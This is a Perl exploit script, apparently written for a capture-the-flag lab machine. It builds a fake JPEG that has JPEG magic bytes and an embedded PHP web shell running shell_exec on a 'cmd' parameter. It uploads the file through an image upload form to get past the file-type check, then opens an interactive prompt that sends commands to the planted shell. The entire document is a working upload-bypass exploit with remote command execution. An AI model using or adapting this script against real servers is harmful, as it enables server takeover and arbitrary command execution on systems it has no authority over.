#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;

my $evilfile = 'evil.php.jpg';

# Writing malicious jpg file
open my $jpg, '>', $evilfile;
# Output "JPEG image data" magic pattern
print $jpg pack('H4xxxx', 'ffd8');
# Output "JFIF standard" magic pattern
print $jpg pack('a*', 'JFIF');
# Output the PHP code
print $jpg '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]); ?>';
close $jpg;
print "evil.php.jpg generated.\n";

my $ua = LWP::UserAgent->new;
my $url = 'http://10.10.10.146/upload.php';
# Input file field
my $file_input = 'myFile';
# Path to the local file that you want to upload

my $res = $ua->post($url,
  Content_Type => 'form-data',
  Content => [
     $file_input => [ $evilfile ],
     'submit' => 'go',
  ],
);

unlink $evilfile;

if ($res->is_success) {
  if ($res->decoded_content eq '<p>file uploaded, refresh gallery</p>') {
    print "File uploaded correctly.\n";
  }
  else {
    print "Unable to upload file.\n";
    exit 1;
  }
}
else {
  print "Unable to upload file.\n";
  exit 1;
}

my $rce = 'http://10.10.10.146/uploads/10_10_14_9.php.jpg';
print "Invoking $rce\n";

my $cmd = '';
while ($cmd ne 'exit') {
  print "> ";
  $cmd = <STDIN>;
  chomp($cmd);
  next if $cmd eq 'exit';
  $res = $ua->post($rce,
    Content => [
       'cmd' => $cmd,
    ],
  );
  print +(split /<pre>/, $res->decoded_content, 2)[1];
}
